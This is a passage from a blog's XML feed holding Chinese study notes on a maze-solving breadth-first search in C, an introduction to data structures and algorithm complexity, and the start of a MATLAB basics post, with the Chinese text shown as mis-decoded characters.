spellcheck="true">//æ¢æµ‹å…«ä¸ªæ–¹å‘çš„è·¯å¾„</span>            i <span class="token operator">=</span> x<span class="token operator">+</span>move<span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token punctuation">.</span>x<span class="token punctuation">;</span> j<span class="token operator">=</span>x<span class="token operator">+</span>move<span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token punctuation">.</span>y<span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>maze<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                rear<span class="token operator">++</span><span class="token punctuation">;</span>                sq<span class="token punctuation">[</span>rear<span class="token punctuation">]</span><span class="token punctuation">.</span>x <span class="token operator">=</span> i<span class="token punctuation">;</span>                sq<span class="token punctuation">[</span>rear<span class="token punctuation">]</span><span class="token punctuation">.</span>y<span class="token operator">=</span>j<span class="token punctuation">;</span>                sq<span class="token punctuation">[</span>rear<span class="token punctuation">]</span><span class="token punctuation">.</span>pre<span class="token operator">=</span>front<span class="token punctuation">;</span>                maze<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//èµ°è¿‡çš„è·¯ç½®-1</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>i<span class="token operator">==</span>m<span class="token operator">&amp;&amp;</span>j<span class="token operator">==</span>m<span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token function">printpath</span><span class="token punctuation">(</span>sq<span class="token punctuation">,</span>rear<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//æ‰“å°è¿·å®«</span>                  <span class="token function">restore</span><span class="token punctuation">(</span>maze<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">//æ¢å¤è¿·å®«ï¼Œæ­¤å¤„æœªå†™è¯¥å‡½æ•°</span>                <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        front<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    retrun <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//æ‰“å°è¿·å®«çš„å‡½æ•°</span><span class="token keyword">void</span> <span class="token function">printpath</span><span class="token punctuation">(</span>sqtype sq<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token keyword">int</span> rear<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    i <span class="token operator">=</span> rear<span class="token punctuation">;</span>    <span class="token keyword">do</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"(%d,%d)&lt;--"</span><span class="token punctuation">,</span>sq<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>x<span class="token punctuation">,</span>sq<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span>        i <span class="token operator">=</span> sq<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>pre<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">while</span><span class="token punctuation">(</span>i<span class="token operator">!=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><img src="https://i.loli.net/2018/10/16/5bc543e6329ce.png" alt=""></p><p>â€‹    å¾ªç¯é˜Ÿåˆ—æ˜¯é˜Ÿåˆ—çš„ä¸€ç§ï¼Œå°±åƒä¸€ä¸ªé¦–å°¾ç›¸è¿çš„è´ªåƒè›‡ï¼Œä¸€ç›´è½¬åœˆï¼Œè¶…è¿‡ä¸€å®šé•¿åº¦ï¼Œå°±ä¼šåƒåˆ°è‡ªå·±çš„å°¾å·´ã€‚    </p><p>â€‹    å¦‚æœæœ‰éœ€è¦ä½¿ç”¨å­˜å‚¨ä¿¡æ¯çš„é˜Ÿåˆ—ï¼Œä¸å»ºè®®ä½¿ç”¨å¾ªç¯é˜Ÿåˆ—ï¼Œå› ä¸ºå¾ªç¯é˜Ÿåˆ—ä¸€æ—¦è¶…å‡ºå®šä¹‰çš„å¤§å°ï¼Œå°±ä¼šå¯¹ä¹‹å‰å­˜å‚¨çš„ä¿¡æ¯å‘ç”Ÿè¦†ç›–ï¼ˆå‘ç”Ÿå‡æº¢å‡ºï¼‰ã€‚</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ç®—æ³• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> ç®—æ³• </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>æ•°æ®ç»“æ„å’Œç®—æ³•-day1</title>
      <link href="/2018/10/07/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95-day1/"/>
      <url>/2018/10/07/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95-day1/</url>
      
        <content type="html"><![CDATA[<p>â€¦â€¦</p><a id="more"></a><h1 id="æ•°æ®ç»“æ„å’Œç®—æ³•-ï¼ˆAlgorithmï¼‰-ç»ªè®º"><a href="#æ•°æ®ç»“æ„å’Œç®—æ³•-ï¼ˆAlgorithmï¼‰-ç»ªè®º" class="headerlink" title="æ•°æ®ç»“æ„å’Œç®—æ³• ï¼ˆAlgorithmï¼‰- ç»ªè®º"></a>æ•°æ®ç»“æ„å’Œç®—æ³• ï¼ˆAlgorithmï¼‰- ç»ªè®º</h1><h2 id="æ•°æ®æ˜¯ä¸ªå•¥ï¼Ÿ"><a href="#æ•°æ®æ˜¯ä¸ªå•¥ï¼Ÿ" class="headerlink" title="æ•°æ®æ˜¯ä¸ªå•¥ï¼Ÿ"></a>æ•°æ®æ˜¯ä¸ªå•¥ï¼Ÿ</h2><p> &nbsp; &nbsp; &nbsp; æ•°æ®ï¼ˆdataï¼‰æ˜¯ä¿¡æ¯çš„è½½ä½“ï¼Œæ˜¯å¯¹å®¢è§‚äº‹ç‰©çš„ç¬¦å·åŒ–è¡¨ç¤ºï¼Œå®ƒçš„å«ä¹‰æä¸ºå¹¿æ³›ï¼ŒåŒ…å«äº†äººä»¬æ—¥ç©¿ç”Ÿæ´»ä¸­çš„å„ç§ä¿¡æ¯åœ¨è®¡ç®—æœºå†…çš„è¡¨ç¤ºï¼Œè€Œ<strong>æ•°æ®å…ƒç´ </strong>åˆ™æ˜¯æ•°æ®çš„åŸºæœ¬å•ä½ã€‚</p><p><img src="http://photo.orsoon.com/JPG-180515/180515_42/k5oFKYNsQz_small.jpg" alt=""></p><h2 id="æ•°æ®ç»“æ„å®šä¹‰"><a href="#æ•°æ®ç»“æ„å®šä¹‰" class="headerlink" title="æ•°æ®ç»“æ„å®šä¹‰"></a>æ•°æ®ç»“æ„å®šä¹‰</h2><p>&nbsp; &nbsp; &nbsp; &nbsp; æ•°æ®ç»“æ„åˆ†ä¸ºé€»è¾‘ç»“æ„å’Œç‰©ç†ç»“æ„ï¼Œä»¥åŠæ•°æ®è¿ç®—ä¸‰æ–¹é¢å†…å®¹ï¼Œä¸€èµ·æ¥æ„‰å¿«åœ°å­¦ä¹ å®ƒå§ğŸ˜­ï¼</p><h3 id="é€»è¾‘ç»“æ„ä¸­å‡ ç§ç»“æ„çš„åŸºæœ¬å®šä¹‰"><a href="#é€»è¾‘ç»“æ„ä¸­å‡ ç§ç»“æ„çš„åŸºæœ¬å®šä¹‰" class="headerlink" title="é€»è¾‘ç»“æ„ä¸­å‡ ç§ç»“æ„çš„åŸºæœ¬å®šä¹‰"></a>é€»è¾‘ç»“æ„ä¸­å‡ ç§ç»“æ„çš„åŸºæœ¬å®šä¹‰</h3><p>â‘  çº¿æ€§ç»“æ„(1:1)ï¼šç»“æ„ä¸­çš„æ•°æ®å…ƒç´ ä¹‹é—´å­˜åœ¨ç€ä¸€å¯¹ä¸€çš„å…³ç³»ï¼Œå¦‚è¡¨ï¼Œæ ˆï¼Œé˜Ÿåˆ—ç­‰ã€‚</p><p>â‘¡ æ ‘å½¢ç»“æ„(1:n)ï¼šç»“æ„ä¸­çš„æ•°æ®å…ƒç´ ä¹‹é—´å­˜åœ¨ç€ä¸€å¯¹å¤šçš„å…³ç³»ã€‚</p><p>â‘¢ å›¾å½¢ç»“æ„(m:n)ï¼šç»“æ„ä¸­çš„æ•°æ®å…ƒç´ ä¹‹é—´å­˜åœ¨ç€å¤šå¯¹å¤šçš„å…³ç³»ï¼Œå›¾å½¢ç»“æ„ä¹Ÿè¢«ç§°ä¸ºç½‘çŠ¶ç»“æ„ã€‚</p><p>â‘£ é›†åˆç»“æ„ï¼šé›†åˆç»“æ„ä¸­çš„æ•°æ®å…ƒç´ ä¹‹é—´çš„å…³ç³»ä»…ä»…æ˜¯â€å±äºåŒä¸€ä¸ªé›†åˆâ€ï¼Œè¿™ç§ç»“æ„ä¸­çš„å…ƒç´ å…³ç³»æä¸ºæ¾æ•£ï¼Œè¯¥ç»“æ„è¾ƒä¸ºå°‘è§ã€‚</p><p>&nbsp; &nbsp; &nbsp; &nbsp; æ€»ä½“æ¥è¯´ï¼Œæ ¹æ®æ•°æ®å…ƒç´ ä¹‹é—´å­˜åœ¨çš„ä¸åŒå…³ç³»ï¼Œæ•°æ®ç»“æ„å¯åˆ†ä¸º<strong>çº¿æ€§ç»“æ„å’Œéçº¿æ€§ç»“æ„ğŸ˜±</strong>ã€‚</p><p><img src="https://i.loli.net/2018/10/07/5bb97795e5dd5.png" alt=""></p><h3 id="æ•°æ®ç»“æ„ä¸­çš„ç‰©ç†ç»“æ„"><a href="#æ•°æ®ç»“æ„ä¸­çš„ç‰©ç†ç»“æ„" class="headerlink" title="æ•°æ®ç»“æ„ä¸­çš„ç‰©ç†ç»“æ„"></a>æ•°æ®ç»“æ„ä¸­çš„ç‰©ç†ç»“æ„</h3><p>&nbsp; &nbsp; &nbsp; &nbsp; æ•°æ®çš„é€»è¾‘ç»“æ„å’Œæ•°æ®çš„å­˜å‚¨æ— å…³ï¼Œå¯¹æ•°æ®çš„æ“ä½œä¸»è¦ä¾èµ–æ•°æ®çš„å­˜å‚¨ï¼Œè€Œæ•°æ®åœ¨è®¡ç®—æœºä¸­çš„å­˜å‚¨è¡¨ç¤ºå³æ•°æ®çš„å­˜å‚¨ç»“æ„å¯åˆ†ä¸º<strong>é¡ºåºå­˜å‚¨</strong>å’Œ<strong>éé¡ºåºå­˜å‚¨</strong>ï¼Œä½†é’ˆå¯¹ä¸€äº›ç‰¹æ®Šåº”ç”¨ï¼Œè¿˜æœ‰<strong>ç´¢å¼•å­˜å‚¨ç»“æ„ï¼Œæ•£åˆ—å­˜å‚¨ï¼ˆhashæ–¹æ³•ï¼‰ç»“æ„</strong>ç­‰å…¶ä»–è¡¨ç¤ºæ–¹æ³•ã€‚</p><p>â‘  <strong>é¡ºåºå­˜å‚¨æ–¹æ³•</strong>ï¼šæŠŠé€»è¾‘ä¸Šç›¸é‚»çš„æ•°æ®å…ƒç´ å‚¨å­˜åœ¨ç‰©ç†ä½ç½®ä¸Šä¹Ÿç›¸é‚»çš„å­˜å‚¨å•å…ƒä¸­ï¼Œä¾‹å¦‚æ•°ç»„å³æ˜¯é¡ºåºå­˜å‚¨æ–¹æ³•ã€‚</p><p>â‘¡ <strong>é“¾å¼å­˜å‚¨æ–¹æ³•</strong>ï¼šé€»è¾‘ä¸Šç›¸é‚»çš„æ•°ç»„å…ƒç´ ä¸è¦æ±‚å…¶åœ¨ç‰©ç†ä½ç½®ä¸Šä¹Ÿç›¸é‚»ï¼Œé€šè¿‡é™„è®¾çš„æŒ‡é’ˆå­—æ®µå€¼æ¥æŒ‡ç¤ºæ•°æ®çš„é€»è¾‘å…³ç³»ï¼Œç®—æ³•ä¸­çš„æŒ‡é’ˆå°±æ˜¯ç”±é“¾å¼å­˜å‚¨ç»“æ„å®ç°çš„ã€‚</p><p>â‘¢ ç´¢å¼•å­˜å‚¨æ–¹æ³•ï¼šé™¤å»ºç«‹å­˜å‚¨ç»“ç‚¹ä¿¡æ¯å¤–ï¼Œè¿˜å»ºç«‹é™„åŠ çš„ç´¢å¼•è¡¨æ¥æ ‡è¯†ç»“ç‚¹çš„åœ°å€ï¼Œç´¢å¼•è¡¨ç”±è‹¥å¹²ç´¢å¼•é¡¹ç»„æˆã€‚ <strong>Dense Indexï¼ˆç¨ å¯†ç´¢å¼•ï¼‰</strong>ä»£è¡¨æ¯ä¸ªæ•°æ®å…ƒç´ åœ¨ç´¢å¼•è¡¨ä¸­å‡æœ‰ä¸€ä¸ªç´¢å¼•é¡¹ã€‚<strong>Sparse Indexï¼ˆç¨€ç–ç´¢å¼•ï¼‰</strong>ï¼Œä»£è¡¨ä¸€ä¸ªç´¢å¼•é¡¹å¯¹åº”ä¸€ç»„æ•°æ®å…ƒç´ ï¼Œ<a href="https://www.cnblogs.com/FreeFire/p/4329528.html" target="_blank" rel="noopener">å‚è€ƒé“¾æ¥</a>ã€‚</p><p>â‘£ æ•£åˆ—å­˜å‚¨æ–¹æ³•ï¼ˆHashæ–¹æ³•ï¼‰ï¼šæ•£åˆ—æ˜¯æ•°ç»„å­˜å‚¨æ–¹å¼çš„ä¸€ç§å‘å±•ï¼Œç›¸æ¯”æ•°ç»„ï¼Œæ•£åˆ—çš„æ•°æ®è®¿é—®é€Ÿåº¦è¦é«˜äºæ•°ç»„ï¼Œå› ä¸ºå¯ä»¥ä¾æ®å­˜å‚¨æ•°æ®çš„éƒ¨åˆ†å†…å®¹æ‰¾åˆ°æ•°æ®åœ¨æ•°ç»„ä¸­çš„å­˜å‚¨ä½ç½®ï¼Œè¿›è€Œèƒ½å¤Ÿå¿«é€Ÿå®ç°æ•°æ®çš„è®¿é—®ï¼Œç†æƒ³çš„æ•£åˆ—è®¿é—®é€Ÿåº¦æ˜¯éå¸¸è¿…é€Ÿçš„ï¼Œè€Œä¸åƒåœ¨æ•°ç»„ä¸­çš„éå†è¿‡ç¨‹ï¼Œé‡‡ç”¨å­˜å‚¨æ•°ç»„ä¸­å†…å®¹çš„éƒ¨åˆ†å…ƒç´ ä½œä¸ºæ˜ å°„å‡½æ•°çš„è¾“å…¥ï¼Œæ˜ å°„å‡½æ•°çš„è¾“å‡ºå°±æ˜¯å­˜å‚¨æ•°æ®çš„ä½ç½®ï¼Œè¿™æ ·çš„è®¿é—®é€Ÿåº¦å°±çœå»äº†éå†æ•°ç»„çš„å®ç°ï¼Œå› æ­¤<strong>æ—¶é—´å¤æ‚åº¦å¯ä»¥è®¤ä¸ºä¸ºO(1)</strong>ï¼Œè€Œ<strong>æ•°ç»„éå†çš„æ—¶é—´å¤æ‚åº¦ä¸ºO(n)</strong>ï¼Œ<a href="https://baike.baidu.com/item/%E6%95%A3%E5%88%97%E5%AD%98%E5%82%A8%E6%96%B9%E6%B3%95/9663463?fr=aladdin" target="_blank" rel="noopener">å‚è€ƒé“¾æ¥</a>ã€‚</p><h2 id="æŠ½è±¡æ•°æ®ç±»å‹ï¼ˆAbstract-Data-Typeï¼ŒADTï¼‰"><a href="#æŠ½è±¡æ•°æ®ç±»å‹ï¼ˆAbstract-Data-Typeï¼ŒADTï¼‰" class="headerlink" title="æŠ½è±¡æ•°æ®ç±»å‹ï¼ˆAbstract Data Typeï¼ŒADTï¼‰"></a>æŠ½è±¡æ•°æ®ç±»å‹ï¼ˆAbstract Data Typeï¼ŒADTï¼‰</h2><p> &nbsp; &nbsp; &nbsp; ADT çš„å®šä¹‰ï¼šä¸€ä¸ªæ•°å­¦æ¨¡å‹ä»¥åŠå®šä¹‰åœ¨è¯¥æ¨¡å‹ä¸Šçš„ä¸€ç»„æ“ä½œã€‚æè¿°æ•°æ®ç»“æ„çš„ä¸€ç§ç†è®ºå·¥å…·ã€‚</p><pre class=" language-bash"><code class="language-bash">ADT æŠ½è±¡æ•°æ®ç±»å‹åç§° <span class="token punctuation">{</span>æ•°æ®å¯¹è±¡ï¼š<span class="token operator">&lt;</span>æ•°æ®å¯¹è±¡å®šä¹‰<span class="token operator">></span>â€¦â€¦æ•°æ®å…³ç³»ï¼š<span class="token operator">&lt;</span>é€»è¾‘å…³ç³»å®šä¹‰<span class="token operator">></span>â€¦â€¦æ“ä½œé›†åˆï¼š  æ“ä½œå1ï¼š  <span class="token operator">&lt;</span>åŸºæœ¬æ“ä½œ1åˆå§‹æ¡ä»¶æè¿°<span class="token operator">></span>  <span class="token operator">&lt;</span>åŸºæœ¬æ“ä½œ1æ“ä½œç»“æœæè¿°<span class="token operator">></span>  â€¦â€¦  â€¦â€¦  æ“ä½œånï¼š  <span class="token operator">&lt;</span>åŸºæœ¬æ“ä½œnåˆå§‹æ¡ä»¶æè¿°<span class="token operator">></span>  <span class="token operator">&lt;</span>åŸºæœ¬æ“ä½œnæ“ä½œç»“æœæè¿°<span class="token operator">></span><span class="token punctuation">}</span>ADTæŠ½è±¡æ•°æ®ç±»å‹åç§°</code></pre><p> &nbsp; &nbsp; &nbsp; ADT çš„ä½œç”¨ï¼šæŠ½è±¡æ•°æ®ç±»å‹å¯ä»¥ä½¿æˆ‘ä»¬æ›´å®¹æ˜“æè¿°ç°å®ä¸–ç•Œã€‚ä¾‹ï¼šç”¨çº¿æ€§è¡¨æè¿°å­¦ç”Ÿæˆç»©è¡¨ï¼Œç”¨æ ‘æˆ–å›¾æè¿°é—ä¼ å…³ç³»ã€‚<strong>ä¼˜ç‚¹æ˜¯æ‹¥æœ‰è¾ƒå¼ºçš„é‡å¤æ€§ï¼Œçµæ´»æ€§ï¼Œå°è£…æ€§ã€‚</strong></p><p> &nbsp; &nbsp; &nbsp; ADT çš„å…³é”®ç‰¹å¾ï¼šä½¿ç”¨å®ƒçš„äººå¯ä»¥åªå…³å¿ƒå®ƒçš„é€»è¾‘ç‰¹å¾ï¼Œä¸éœ€è¦äº†è§£å®ƒçš„å­˜å‚¨æ–¹å¼ã€‚å®šä¹‰å®ƒçš„äººåŒæ ·ä¸å¿…è¦å…³å¿ƒå®ƒå¦‚ä½•å­˜å‚¨ã€‚</p><p> &nbsp; &nbsp; &nbsp; ä¾‹å¦‚ï¼šçº¿æ€§è¡¨è¿™æ ·çš„æŠ½è±¡æ•°æ®ç±»å‹ï¼Œå…¶æ•°å­¦æ¨¡å‹æ˜¯ï¼š<a href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E5%85%83%E7%B4%A0" target="_blank" rel="noopener">æ•°æ®å…ƒç´ </a>çš„é›†åˆï¼Œè¯¥é›†åˆå†…çš„å…ƒç´ æœ‰è¿™æ ·çš„å…³ç³»ï¼šé™¤ç¬¬ä¸€ä¸ªå’Œæœ€åä¸€ä¸ªå¤–ï¼Œæ¯ä¸ªå…ƒç´ æœ‰å”¯ä¸€çš„å‰è¶‹å’Œå”¯ä¸€çš„åç»§ã€‚å¯ä»¥æœ‰è¿™æ ·ä¸€äº›æ“ä½œï¼šæ’å…¥ä¸€ä¸ªå…ƒç´ ã€åˆ é™¤ä¸€ä¸ªå…ƒç´ ç­‰ã€‚</p><p> &nbsp; &nbsp; &nbsp; <strong>ä»æŠ½è±¡æ•°æ®ç±»å‹çš„è§’åº¦çœ‹ï¼Œæ•°æ®ç»“æ„æ˜¯ADTçš„ç‰©ç†å®ç°ã€‚</strong></p><h2 id="ç®—æ³•çš„å¤æ‚åº¦"><a href="#ç®—æ³•çš„å¤æ‚åº¦" class="headerlink" title="ç®—æ³•çš„å¤æ‚åº¦"></a>ç®—æ³•çš„å¤æ‚åº¦</h2><p> &nbsp; &nbsp; &nbsp; ç®—æ³•çš„å¤æ‚åº¦é€šå¸¸åˆ†ä¸ºæ—¶é—´å¤æ‚åº¦ï¼Œç©ºé—´å¤æ‚åº¦ï¼Œé‡‡ç”¨<strong>â€œå¤§Oè¡¨ç¤ºæ³•â€</strong>å®šä¹‰ç®—æ³•æ•ˆç‡åº¦é‡ã€‚</p><h3 id="æ—¶é—´å¤æ‚åº¦"><a href="#æ—¶é—´å¤æ‚åº¦" class="headerlink" title="æ—¶é—´å¤æ‚åº¦"></a>æ—¶é—´å¤æ‚åº¦</h3><p> &nbsp; &nbsp; &nbsp; åˆ¤å®šç®—æ³•æ€§èƒ½çš„ä¸€ä¸ªåŸºæœ¬è€ƒè™‘æ˜¯å¤„ç†ä¸€å®š<strong>â€œè§„æ¨¡ï¼ˆSizeï¼‰â€</strong>çš„è¾“å…¥æ—¶ï¼Œè¯¥ç®—æ³•æ‰€éœ€æ‰§è¡Œçš„<strong>â€œåŸºæœ¬æ“ä½œæ•°ï¼ˆBasic Operationï¼‰â€ã€‚</strong></p><p> &nbsp; &nbsp; &nbsp; T(N) = O(f(N))æ˜¯æŒ‡ä¿è¯å‡½æ•°T(N)ä»¥ä¸å¿«äºf(N)é€Ÿåº¦å¢é•¿ï¼›f(N)æ˜¯ä¸€ä¸ªä¸Šç•Œï¼ˆupper boundï¼‰ï¼Œå³æŸä¸ªç®—æ³•çš„å¢é•¿ç‡æœ€å·®æƒ…å†µæ˜¯f(N)ï¼Œç»™å‡ºå‡ ä¸ªä¾‹å­ï¼š</p><pre class=" language-c"><code class="language-c"><span class="token number">1</span><span class="token punctuation">.</span> <span class="token punctuation">{</span> <span class="token operator">++</span>x<span class="token punctuation">;</span>s<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token comment" spellcheck="true">//1.ç®—æ³•æ—¶é—´å¤æ‚åº¦ä¸º O(1),ç§°ä¸ºå¸¸é‡é˜¶</span><span class="token number">2</span><span class="token punctuation">.</span> <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token operator">++</span>x<span class="token punctuation">;</span>s<span class="token operator">+</span><span class="token operator">=</span>x<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//2.ç®—æ³•æ—¶é—´å¤æ‚åº¦ä¸º O(n),ç§°ä¸ºçº¿æ€§é˜¶</span><span class="token number">3</span><span class="token punctuation">.</span> <span class="token keyword">for</span> <span class="token punctuation">(</span>j<span class="token operator">=</span>i<span class="token punctuation">;</span>j<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>k<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>k<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>k<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token operator">++</span>x<span class="token punctuation">;</span>        s<span class="token operator">+</span><span class="token operator">=</span>x<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//3.ç®—æ³•æ—¶é—´å¤æ‚åº¦ä¸º O(n*n),ç§°ä¸ºå¹³æ–¹é˜¶</span><span class="token number">4</span><span class="token punctuation">.</span>i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span>i<span class="token operator">&lt;=</span>n<span class="token punctuation">)</span><span class="token punctuation">{</span> i<span class="token operator">=</span>i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token comment" spellcheck="true">//4.ç®—æ³•æ—¶é—´å¤æ‚åº¦ä¸º O(log2n),ç§°ä¸ºå¯¹æ•°é˜¶</span><span class="token comment" spellcheck="true">//æ ¹æ®åŸºæœ¬æ‰§è¡Œæ¬¡æ•°ï¼Œè¿ç”¨æé™çš„æ–¹æ³•æ¥è®¡ç®—å¤æ‚åº¦</span></code></pre><h3 id="ç©ºé—´å¤æ‚åº¦"><a href="#ç©ºé—´å¤æ‚åº¦" class="headerlink" title="ç©ºé—´å¤æ‚åº¦"></a>ç©ºé—´å¤æ‚åº¦</h3><p> &nbsp; &nbsp; &nbsp; ä¸€ä¸ªç¨‹åºçš„ç©ºé—´å¤æ‚åº¦æ˜¯æŒ‡ä»ç¨‹åºè¿è¡Œåˆ°ç»“æŸæ‰€éœ€çš„å­˜å‚¨é‡ã€‚è€Œç¨‹åºçš„å­˜å‚¨ç©ºé—´åˆ†ä¸ºå›ºå®šéƒ¨åˆ†å’Œå¯å˜éƒ¨åˆ†ï¼Œå°±åƒç”µè„‘åˆ†äº†ç¡¬ç›˜å­˜å‚¨ç©ºé—´å’Œå†…å­˜å­˜å‚¨ç©ºé—´ä¸€æ ·ğŸ˜„ï¼Œç¨‹åºæœ¬èº«æ‰€å çš„ç‰©ç†ç©ºé—´åŠ ä¸Šç¨‹åºè¿è¡Œæ—¶æ‰€éœ€è¦çš„å†…å­˜ç»„æˆäº†ç¨‹åºè¿è¡Œæ‰€éœ€çš„å­˜å‚¨ç©ºé—´ã€‚</p><p>Try to get the best answerï¼</p>]]></content>
      
      
      <categories>
          
          <category> ç®—æ³• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç®—æ³• </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>æ•°å­¦å»ºæ¨¡-day2</title>
      <link href="/2018/10/07/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1-day2/"/>
      <url>/2018/10/07/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1-day2/</url>
      
        <content type="html"><![CDATA[<p>â€¦â€¦</p><a id="more"></a><h1 id="æ•°å­¦å»ºæ¨¡-day2-â€“-matlab-åŸºæœ¬ç”¨æ³•"><a href="#æ•°å­¦å»ºæ¨¡-day2-â€“-matlab-åŸºæœ¬ç”¨æ³•" class="headerlink" title="æ•°å­¦å»ºæ¨¡_day2 â€“ matlab åŸºæœ¬ç”¨æ³•"></a>æ•°å­¦å»ºæ¨¡_day2 â€“ matlab åŸºæœ¬ç”¨æ³•</h1><p><img src="https://i.loli.net/2018/10/07/5bb957ec92262.png" alt=""><br>&nbsp; &nbsp; &nbsp; &nbsp; matlab æ•´ä½“ç•Œé¢å¦‚ä¸Šå›¾ï¼Œåœ¨matlabä¸­ä¸€èˆ¬éœ€è¦åˆ›å»ºå˜é‡ï¼Œè°ƒç”¨å‡½æ•°ï¼Œå®šä¹‰å˜é‡å’Œ python ç±»ä¼¼ï¼Œ<strong>å¦‚æœæ²¡æœ‰å®šä¹‰è¾“å‡ºå˜é‡ï¼Œmatlabåˆ™ä¼šä½¿ç”¨ä¸€ä¸ªåä¸ºansçš„å˜é‡å­˜å‚¨è®¡ç®—ç»“æœã€‚</strong></p><p> &nbsp; &nbsp; &nbsp; matlabä¸»è¦è¢«ç”¨æ¥å¯¹æ•´ä¸ªçŸ©é˜µæˆ–è€…æ•°ç»„è¿›è¡Œæ“ä½œã€‚</p><h3 id="ä¸€-é‚£ä¹ˆå¦‚ä½•æ¥è¿›è¡Œæ•°ç»„çš„åˆ›å»ºå‘¢ï¼š"><a href="#ä¸€-é‚£ä¹ˆå¦‚ä½•æ¥è¿›è¡Œæ•°ç»„çš„åˆ›å»ºå‘¢ï¼š" class="headerlink" title="ä¸€. é‚£ä¹ˆå¦‚ä½•æ¥è¿›è¡Œæ•°ç»„çš„åˆ›å»ºå‘¢ï¼š"></a>ä¸€. é‚£ä¹ˆå¦‚ä½•æ¥è¿›è¡Œæ•°ç»„çš„åˆ›å»ºå‘¢ï¼š</h3><ul><li><p>éšä¾¿åˆ›å»ºä¸€ä¸ªä¸€ç»´æ•°ç»„ a= [1 2 3 4],ä¹Ÿå¯ç§°ä½œå•è¡ŒçŸ©é˜µæˆ–è¡Œå‘é‡</p><p><img src="https://i.loli.net/2018/10/07/5bb959beb45e8.png" alt=""></p></li><li><p>åˆ›å»ºå¤šè¡ŒçŸ©é˜µåˆ™ç”¨åˆ†å·åˆ†å¼€</p><p><img src="https://i.loli.net/2018/10/07/5bb95a474bb84.png" alt=""></p></li></ul><h3 id="äºŒ-ç”¨å‡½æ•°å¯¹çŸ©é˜µå’Œæ•°ç»„è¿›è¡Œä¸€äº›æ“ä½œï¼š"><a href="#äºŒ-ç”¨å‡½æ•°å¯¹çŸ©é˜µå’Œæ•°ç»„è¿›è¡Œä¸€äº›æ“ä½œï¼š" class="headerlink" title="äºŒ. ç”¨å‡½æ•°å¯¹çŸ©é˜µå’Œæ•°ç»„è¿›è¡Œä¸€äº›æ“ä½œï¼š"></a>äºŒ. ç”¨å‡½æ•°å¯¹çŸ©é˜µå’Œæ•°ç»„è¿›è¡Œä¸€äº›æ“ä½œï¼š</h3><ul><li><p>sin,cos,tan,cotç­‰å‡½æ•°éƒ½èƒ½ä½¿ç”¨:</p><p><img src="https://i.loli.net/2018/10/07/5bb95b8054e4c.png" alt=""></p></li><li><p>çŸ©é˜µçš„åŠ å‡ä¹˜é™¤ä»¥åŠè½¬ç½®ï¼ˆå…±è½­è½¬ç½®ä¸º bâ€™ ,éå…±è½­è½¬ç½®ä¸ºè¿ç®— b.â€™å¯¹äºå®æ•°æ²¡æœ‰åŒºåˆ«) ,äººæ€§åŒ–çš„æŠ¥é”™ğŸ˜„å¥½è¯„ï¼š</p><p><img src="https://i.loli.net/2018/10/07/5bb95c2d99dcf.png" 